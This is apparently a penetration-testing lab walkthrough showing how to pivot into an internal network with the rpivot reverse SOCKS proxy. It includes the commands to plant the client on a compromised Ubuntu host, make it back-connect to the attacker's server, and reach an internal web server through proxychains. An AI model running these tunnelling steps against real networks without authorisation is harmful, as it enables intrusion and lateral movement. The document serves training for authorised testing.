
[Rpivot](https://github.com/klsecservices/rpivot) is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side. We will take the scenario below, where we have a web server on our internal network (`172.16.5.135`), and we want to access that using the rpivot proxy.

#### Cloning rpivot

  Web Server Pivoting with Rpivot

```shell-session
hidalg0dd@htb[/htb]$ sudo git clone https://github.com/klsecservices/rpivot.git
```

#### Installing Python2.7

  Web Server Pivoting with Rpivot

```shell-session
hidalg0dd@htb[/htb]$ sudo apt-get install python2.7
```

We can start our rpivot SOCKS proxy server to connect to our client on the compromised Ubuntu server using `server.py`.

#### Running server.py from the Attack Host

  Web Server Pivoting with Rpivot

```shell-session
hidalg0dd@htb[/htb]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Before running `client.py` we will need to transfer rpivot to the target. We can do this using this SCP command:

#### Transfering rpivot to the Target

  Web Server Pivoting with Rpivot

```shell-session
hidalg0dd@htb[/htb]$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

#### Running client.py from Pivot Target

  Web Server Pivoting with Rpivot

```shell-session
ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

Backconnecting to server 10.10.14.18 port 9999
```

#### Confirming Connection is Established

  Web Server Pivoting with Rpivot

```shell-session
New connection from host 10.129.202.64, source port 35226
```

We will configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host, which was initially started by the Python server.

Finally, we should be able to access the webserver on our server-side, which is hosted on the internal network of 172.16.5.0/23 at 172.16.5.135:80 using proxychains and Firefox.

#### Browsing to the Target Webserver using Proxychains

  Web Server Pivoting with Rpivot

```shell-session
proxychains firefox-esr 172.16.5.135:80
```